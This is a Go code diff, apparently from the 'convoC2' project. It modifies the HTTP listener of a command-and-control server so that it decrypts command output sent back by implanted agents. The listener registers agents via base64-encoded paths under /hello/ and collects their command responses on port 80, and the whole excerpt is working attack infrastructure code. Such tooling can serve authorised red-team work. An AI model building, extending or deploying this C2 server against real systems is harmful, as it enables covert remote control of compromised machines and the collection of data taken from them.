@@ -8,6 +8,7 @@ import (
 	"os"
 	"strings"
 
+	"github.com/cxnturi0n/convoC2/pkg/crypto"
 )
 
 var BindIp string
@@ -28,8 +29,7 @@ type Agent struct {
 	CommandHistoryCmd []string
 }
 
-
-func StartHttpListener(agentChan chan Agent, commandResponsesChan chan CommandResponse){
+func StartHttpListener(agentChan chan Agent, commandResponsesChan chan CommandResponse) {
 	http.HandleFunc("/hello/", func(w http.ResponseWriter, r *http.Request) {
 		base64EncodedAgent := strings.TrimPrefix(r.URL.Path, "/hello/")
 		decoded, _ := base64.StdEncoding.DecodeString(base64EncodedAgent)
@@ -45,11 +45,21 @@ func StartHttpListener(agentChan chan Agent, commandResponsesChan chan CommandRe
 
 		var response CommandResponse
 		_ = json.Unmarshal(decoded, &response)
+
+		// Try to decrypt the output if it's encrypted
+		decryptedOutput, err := crypto.Decrypt(response.Output, response.AgentID)
+		if err == nil {
+			// if decryption succeeds, replace with decrypted output
+			response.Output = decryptedOutput
+		}
+
+		// If decryption fails, keep the original output
+
 		commandResponsesChan <- response
 	})
 
-	err := http.ListenAndServe(BindIp+":80", nil) 
-	if err != nil{
+	err := http.ListenAndServe(BindIp+":80", nil)
+	if err != nil {
 		fmt.Fprint(os.Stderr, err)
 		os.Exit(1)
 	}
